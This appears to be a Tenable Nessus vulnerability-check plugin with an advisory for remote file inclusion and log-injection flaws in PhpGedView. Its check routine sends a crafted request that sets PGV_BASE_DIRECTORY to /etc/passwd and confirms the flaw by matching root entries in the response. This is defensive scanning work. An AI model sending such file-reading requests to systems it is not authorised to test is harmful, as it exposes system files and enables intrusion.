#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is prone to a
remote file inclusion vulnerability. 

Description :

The remote host appears to be running PhpGedView, a web-based
genealogy program written in PHP. 

The version of PhpGedView installed on the remote host fails to
sanitize user-supplied input to the 'PGV_BASE_DIRECTORY' parameter of
the 'help_text_vars.php' script before using it in a PHP 'require'
function.  Provided PHP's 'register_globals' setting is enabled, an
unauthenticated attacker may be able to exploit this flaw to read
arbitrary files on the remote host and or run arbitrary code, possibly
taken from third-party hosts, subject to the privileges of the web
server user id. 

In addition, the application reportedly fails to sanitize user input
to the 'user_language', 'user_email', and 'user_gedcomid' parameters
of the 'login_register.php' script, which could be used by an attacker
to inject arbitrary PHP code into a log file that can then be executed
on the affected host, subject to the permissions of the web server
user id. 

See also :

http://retrogod.altervista.org/phpgedview_337_xpl.html
https://sourceforge.net/tracker/index.php?func=detail&aid=1386434&group_id=55456&atid=477081

Solution :

Upgrade to PhpGedView 3.3.7 or 4.0 beta 3 and apply the patch
referenced in the vendor advisory above. 

Risk factor :

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";


if (description) {
  script_id(20339);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2005-4467", "CVE-2005-4468", "CVE-2005-4469");
  script_bugtraq_id(15983);
  script_xref(name:"OSVDB", value:"22009");
  script_xref(name:"OSVDB", value:"22010");

  script_name(english:"PhpGedView PGV_BASE_DIRECTORY Parameter Remote File Include Vulnerability");
  script_summary(english:"Checks for PGV_BASE_DIRECTORY parameter remote file include vulnerability in PhpGedView");
 
  script_description(english:desc);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/phpgedview", "/phpGedView", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit the flaw to read a file.
  file = "/etc/passwd";
  req = http_get(
    item:string(
      dir, "/help_text_vars.php?",
      "PGV_BASE_DIRECTORY=", file
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if... 
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying it can't open an empty file
    #
    # nb: this suggests register_globals is off, but since the fix
    #     reports "Now, why would you want to do that", the log file
    #     command injection flaw might still exist.
    "Failed opening required ''" >< res
  ) {
      contents = res - strstr(res, "<br />");

      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        contents
      );

    security_warning(port:port, data:report);
    exit(0);
  }
}
